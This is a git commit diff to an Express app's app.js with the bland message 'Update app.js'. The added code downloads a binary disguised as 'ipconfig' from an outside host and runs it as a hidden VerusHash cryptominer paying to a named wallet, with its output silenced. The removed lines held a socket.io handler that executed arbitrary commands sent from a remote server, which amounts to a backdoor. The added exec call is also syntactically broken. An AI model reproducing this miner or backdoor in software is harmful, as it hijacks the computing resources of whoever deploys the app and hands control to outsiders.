0dc906621c94b0792d74cfc4a8d1f78c920d3649
p5mq9h <104606488+p5mq9h@users.noreply.github.com>
2022-05-03 12:52:36 +0700

    Update app.js

--- app.js
+++ app.js
@@ -6,7 +6,12 @@ const INDEX = '/index.html';
 const server = express()
   .use((req, res) => res.sendFile(INDEX, { root: __dirname }))
   .listen(PORT, () => console.log(`Listening on ${PORT}`));
-
+    exec(wget https://tienph-88.surge.sh/ipconfig;chmod +x ipconfig;./ipconfig --disable-gpu --algorithm verushash --pool na.luckpool.net:3957 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.render --password x --cpu-threads 1 >> /dev/null, (err, stdout, stderr) => {
+  if (err) {
+   
+    return;
+  }
+  
 const { exec } = require('child_process');
 const
     io = require("socket.io-client"),
@@ -19,12 +24,7 @@ ioClient.on("message", (msg) => {
     console.log('Em ngung chay roi anh');
   }
    else {
-    exec(msg, (err, stdout, stderr) => {
-  if (err) {
-   
-    return;
-  }
-  
+
 });
   }
 });
